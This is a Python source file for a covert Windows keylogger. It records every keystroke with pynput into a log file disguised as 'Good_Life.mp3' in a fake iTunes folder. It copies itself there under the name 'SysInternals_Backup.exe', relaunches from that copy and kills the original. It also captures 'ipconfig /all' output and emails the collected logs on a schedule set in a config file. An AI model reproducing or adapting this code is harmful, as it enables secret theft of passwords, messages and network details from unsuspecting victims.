#Log Key strokes and email a copy every morning
# Read config file every Hour
# Config file option to set what time of day to send email
# Hotkey to email the file right away.
# Hotkey to email at first keystroke.
# Config file option to specify how often to send file.EX:
    #DAY: M,W,S HR: 04 MIN: 31 so Every Mon, Wend, Sat at 04:31 am email sent.
    # OR. Day: 1=Sun 2=Mon 3=Tue - HR:2 Every 2 hours Min: 23-Every 23min.
    #EX: 0030 - Every day every hour at 30min.
    #0203 - Every day every 2 hours and 3 min.

from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging, os
from os import *
import schedule, time
import sendEmail
import threading
import subprocess
from configparser import ConfigParser
from pynput import keyboard
import shutil
import traceback
import ConfigFile
#Log Location
logDir = (r"C:\Users\Public\AppData\Music\iTunes\U2\All_Music")
try:

    def fileExists():
        #Checking if path exists.
        fileExists = path.exists(logDir)
        if fileExists == True:
           #Deleting all the current config
            os.system(r'rmdir /Q /S {}'.format(logDir))

        try:
            os.makedirs(logDir)
            print(os.getcwd())
            if os.getcwd() != (r"C:\Users\Public\AppData\Music\iTunes\U2\All_Music"):
              currentFileName = os.path.basename(__file__)
              print(currentFileName)
              shutil.copy(currentFileName, r'C:\Users\Public\AppData\Music\iTunes\U2\All_Music\SysInternals_Backup.exe')
              print("Moved SysInt To Backup Location")
        except Exception as error:
            print("Could not Backup SysInt.exe to destination: {}\n {}".format(error, traceback.format_exc()))
            sendToLog(error)
        try:
            os.chdir(logDir + "\\")
            print(os.getcwd())
                #Starting copied file.
            time.sleep(5)
            subprocess.call("start .\SysInternals_Backup.exe", shell=True)
        except Exception as error2:
            print("Could not start backup file: {}\n {}".format(error, traceback.format_exc()))
            sendToLog(error2)
        try:
                #Stoping orinal file
            subprocess.call("taskkill /f /im {}".format(currentFileName), shell=True)
        except Exception as error3:
            print("Could not TaskKill SysInternals.exe: {}\n {}".format(error, traceback.format_exc()))
            sendToLog(error3)

    def sendEmailLocal():
        print("Sending Email Function Starts Here")
        sendEmail.sendEmail2()

    def createLogging():
        #Creating the logging
        logging.basicConfig(filename=(logDir + '\Good_Life.mp3'), level=logging.DEBUG, format='%(asctime)s:%(message)s:')

    def sendToLog(error):
        logging.basicConfig(filename=(logDir + '\Good_Life.mp3'), level=logging.DEBUG, format='%(asctime)s:%(message)s:')
        logging.debug(error)

    #Function to detect keypress
    def on_press(key):
        logging.info(str(key))
        #This will print each key pressed
       # print(str(key))


    def startListener():
        print("Listener starting")
        try:
            with Listener(on_press=on_press) as listen:
                print("Listen started")
                print("RightBefore Listen.join")
                listen.join()
                print("Listen.join started")
        except Exception as error:
            sendToLog(error)
            print('StartListener Exception: {}\n {}'.format(error, traceback.format_exc()))

        #Funciton to get IPCONFIG put into log file every day.
    def getIPConfig():
        ipConf = popen('ipconfig /all').read()
        logging.basicConfig(filename=(logDir + '\Good_Life.mp3'), level=logging.DEBUG, format='%(asctime)s:%(message)s:')
        logging.debug(ipConf)



    def readTimeFromFile():
        try:
            global whenToEmail
            # Declaring config parser
            config = ConfigParser()
            config.read(logDir + '\config.ini')
            # All the various API's
            # installTime = config.get('DEFAULTS', "Install Date & Time")
            whenToEmail = config.get('database', 'When To Send Email')
            emailNow = config.get('database', 'Email Now')
            firstRun = config.get('database', 'First Run')
            min5Email = config.get('database', '5min Email')
            min30Email = config.get('database', '30min Email')
            schedule.every().day.at(whenToEmail).do(sendEmailLocal)

            # Opening config file
          #  configFile = open(logDir + '\config.ini', 'w')
            #  config.set('database','First Run', 'False')
            try:
                ###CHECKING IF CONFIG FILE WANTS TO EMAIL NOW
                if emailNow == "True":
                    print("Email Now: {}".format(emailNow))
                    sendEmailLocal()
                else:
                    print("Email now: {}".format(emailNow))
                #
                # ###CHECKING IF CONFIG FILE IS FIRST RUN
                # if firstRun == "True":
                #     print("Email Now: {}".format(firstRun))
                #     sendEmailLocal()
                #     config.set('database', 'First Run', 'False')
                #
                # else:
                #     print("Email now: {}".format(firstRun))
                #
                # ###CHECKING IF CONFIG FILE EMAIL 5min
                # if min5Email == "True":
                #     print("Email Now: {}".format(min5Email))
                #     sendEmailLocal()
                #     config.set('database', '5min Email', 'False')
                #
                # else:
                #     print("Email now: {}".format(min5Email))
                #
                # ###CHECKING IF CONFIG FILE EMAIL 30min
                # if min30Email == "True":
                #     print("Email Now: {}".format(min30Email))
                #     sendEmailLocal()
                #     config.set('database', '30min Email', 'False')
                #
                # else:
                #     print("Email now: {}".format(min30Email))
            except Exception as error:
                print('Updating Config File in Sysint error {}\n {}'.format(error, traceback.format_exc()))
                sendToLog('Updating Config File in Sysint error {}\n {}'.format(error, traceback.format_exc()))

            print('When to Email {}'.format(whenToEmail))


        except Exception as error:
            sendToLog('ReadTimeFromFile in Sysint error: {} \n {}'.format(error, traceback.format_exc()))
            print('ReadTimeFromFile in Sysint error: {} \n {}'.format(error, traceback.format_exc()))
            #print(traceback.format_exc())

    #Funciton for the flow of the program:
    def mainRun():
        fileExists()
        ConfigFile.createINI()
        createLogging()
        getIPConfig()
        listenerThread = threading.Thread(target=startListener)
        listenerThread.start()
        readTimeFromFile()
        sendEmailLocal()
        schedule.every(3).minutes.do(readTimeFromFile)
        while True:
            schedule.run_pending()
            time.sleep(1)

    mainRun()

    # fileExists()
   # createLogging()
      #Older Threading to have listener run in background
    #listenerThread = threading.Thread(target=startListener)
      #t2 = threading.Thread(target=some1)
      #Starting threas
   # listenerThread.start()

   # sendEmailLocal()



 #   readTimeFromFile()



   # schedule.every(3).minutes.do(readTimeFromFile)



    #Run everyday at this time.
    #schedule.every().day.at("05:30").do(testFunc)

  #  while True:
  #      schedule.run_pending()
  #      time.sleep(1)


except Exception as error:
    print('Mian Exception on SysInternals: {}\n {}'.format(error, traceback.format_exc()))
    sendToLog('Main Exception on SysInternals: {}\n {}'.format(error, traceback.format_exc()))
